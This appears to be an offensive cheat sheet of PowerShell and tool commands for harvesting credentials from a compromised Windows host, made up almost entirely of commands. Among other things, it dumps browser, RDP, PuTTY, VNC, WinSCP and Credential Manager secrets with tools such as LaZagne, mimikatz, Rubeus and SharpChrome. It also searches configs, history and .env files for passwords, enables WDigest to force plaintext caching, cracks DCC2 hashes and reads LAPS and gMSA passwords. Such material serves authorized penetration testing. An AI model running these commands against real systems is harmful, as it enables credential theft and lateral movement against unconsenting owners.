## Tools
```powershell
lazagne.exe all


```

## 

## Stored RDP credentials
```powershell
Get-ChildItem "HKCU:\Software\Microsoft\Terminal Server Client\Servers"
```

## Unattended install files
```powershell
Get-ChildItem -Recurse -Path C:\ -Include unattend.xml,sysprep.inf,sysprep.xml 2>$null
```

## Group Policy Preferences (GPP) passwords
```powershell
Get-GPPPassword   

findstr /S /I "cpassword" \\<DC>\sysvol\<domain>\Policies\*.xml
```

## PowerShell history
```powershell
Get-Content (Get-PSReadLineOption).HistorySavePath
type C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

## Web.config / appsettings.json
```powershell
Get-ChildItem -Recurse -Path C:\inetpub -Include web.config | Select-String "password"
Get-ChildItem -Recurse -Path C:\ -Include *.config,*.json | Select-String -Pattern "password|pwd|pass" 2>$null
```

## Credential Manager
```powershell
cmdkey /list

vault::cred
vault::list
```

## Browser credential dump
```powershell
.\HackBrowserData.exe -b chrome -f json -o ./output

.\SharpChrome.exe logins /unprotect

Import-Module .\SessionGopher.ps1
Invoke-SessionGopher -Target WINLPE-SRV01
```

## SSH keys
```powershell
Get-ChildItem -Recurse -Path C:\Users -Include id_rsa,*.pem,*.ppk 2>$null
```

## KeePass database
```powershell
Get-ChildItem -Recurse -Path C:\Users -Include *.kdbx 2>$null
```

## Scheduled Tasks-da hardcoded creds
```powershell
Get-ScheduledTask | Select TaskName, @{N='Run As';E={$_.Principal.UserId}} | Where {$_.'Run As' -ne "SYSTEM"}
schtasks /query /fo LIST /v | findstr /i "run as\|task to run"
```

## Services-da hardcoded creds
```powershell
Get-WmiObject win32_service | Select Name, StartName, PathName | Where {$_.StartName -notlike "LocalSystem"}
sc qc <service_name>
```

## Environment variables passwords
```powershell
Get-ChildItem Env: | Select Name, Value | Where {$_.Name -match "pass|pwd|key|secret|token"}
[System.Environment]::GetEnvironmentVariables()
# .env faylları:
Get-ChildItem -Recurse -Path C:\ -Include .env 2>$null | Select-String "pass"
```

## AutoLogon credentials (registry)
```powershell
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
```

## PuTTY saved sessions
```powershell
reg query HKCU\Software\SimonTatham\PuTTY\Sessions /s
```

## VNC Passwords
```powershell
reg query HKLM\SOFTWARE\RealVNC\WinVNC4 /v Password
reg query HKCU\Software\TightVNC\Server /v Password
reg query HKLM\SOFTWARE\ORL\WinVNC3\Default /v Password
```

## SNMP community strings
```powershell
reg query HKLM\SYSTEM\CurrentControlSet\Services\SNMP\Parameters\ValidCommunities
```

## Dialup / VPN credentials
```powershell
reg query "HKLM\SYSTEM\CurrentControlSet\Services\RemoteAccess\Parameters"
```

## mRemoteNG passwords
```powershell
Get-ChildItem -Recurse -Path "$env:APPDATA\mRemoteNG" -Include confCons.xml
```

## WinSCP saved sessions
```powershell
reg query HKCU\Software\Martin Prikryl\WinSCP 2\Sessions /s
```

## FileZilla saved credentials
```powershell
Get-Content "$env:APPDATA\FileZilla\sitemanager.xml"
Get-Content "$env:APPDATA\FileZilla\recentservers.xml"
```

## Git config / .git history
```powershell
Get-ChildItem -Recurse -Path C:\Users -Include .gitconfig 2>$null
Get-ChildItem -Recurse -Path C:\ -Include .git -Directory 2>$null

git log --all --full-history -- "*.config"
```

## IIS applicationHost.config
```powershell
Get-Content "C:\Windows\System32\inetsrv\config\applicationHost.config" | Select-String -Pattern "userName|password"
```

## MSSQL connection strings
```powershell
Get-ChildItem -Recurse -Path C:\ -Include *.config | Select-String "Data Source|Password|User Id" 2>$null
```

## Sticky Notes
```powershell
Get-Content "$env:LOCALAPPDATA\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite"
strings plum.sqlite | Select-String -Pattern "pass|pwd"
```

## Clipboard dump
```powershell
Add-Type -AssemblyName System.Windows.Forms
[System.Windows.Forms.Clipboard]::GetText()
```

## WDigest enable → plaintext creds
```powershell
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1
```

## Cached credentials (DCC2)
```powershell
lsadump::cache
hashcat -m 2100 dcc2_hashes.txt wordlist.txt
```

## Kerberos ticket dump → Pass-the-Ticket
```powershell
sekurlsa::tickets /export
.\Rubeus.exe dump /nowrap
```

## LAPS Passwords
```powershell
Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd | Select Name, "ms-Mcs-AdmPwd"
crackmapexec ldap <DC_IP> -u user -p pass --module laps
```

## gMSA Passwords
```powershell
.\Rubeus.exe asktgt /user:gMSA_account$ /rc4:<hash>
(Get-ADServiceAccount -Identity gMSA_name -Properties msDS-ManagedPassword).'msDS-ManagedPassword'
```
